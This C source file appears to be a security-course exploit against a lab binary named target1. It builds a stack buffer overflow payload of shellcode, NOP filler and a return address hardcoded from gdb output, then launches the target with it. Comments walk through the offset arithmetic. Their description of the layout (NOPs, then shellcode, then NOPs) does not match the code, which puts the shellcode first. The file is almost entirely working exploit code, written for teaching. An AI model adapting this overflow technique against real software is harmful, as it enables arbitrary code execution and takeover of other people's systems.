#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
		
	/* 

	REFERENCE: https://www.soldierx.com/tutorials/Stack-Smashing-Modern-Linux-System

	INFO FROM GDB:

		% info frame
			Arglist at 0x2021fe80, args: argc=2, argv=0x7fffffffede8
 			Locals at 0x2021fe80, Previous frame's sp is 0x2021fe90
 			Saved registers:
  			rbp at 0x2021fe80, rip at 0x2021fe88

		% p &buf
			0x2021fe10

		Difference between next instruction pointer and starting address of
		buffer on the stack is 120 bytes. Hence, we need to cause overflow of 
		120 bytes + overwrite the return address i.e. make rip store the start
		address of the buffer. So 120th to 124th places in our exploit string
		will be buffer start address.

		SHELL CODE: 45 bytes + 3 bytes word_ alignment

		Buffer size: 96 bytes

		//  Acc. to lecture, we can't accurately judge the  buf start address so we add NOP instructions.

		Remaining buf_size after adding shellcode = 48 bytes. Hence, we need to fill buffer by 48 bytes NOP instructions
		After shellcode, we again fill the space till 120 by NOP instructions.

		So args[1] looks like NOP instructions + shellcode + NOP instructions + buf start address from gdb with total 124 bytes

	*/

	// Initialize explit string
	char exploit[124];
	bzero(exploit, 124);

	strcat(exploit, shellcode); // append the shellcode to exploit string

	// fill up the space after the shellcode up to the 120th position with NOP
	int pos = strlen(exploit);	
	memset(&exploit[pos], NOP, 120 - pos);

	// overwrite return address with buf start address
	char* retaddr = (char*)0x2021fe10;
  	SET_VALUE(exploit, 120, retaddr);


	args[1] = exploit;

	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}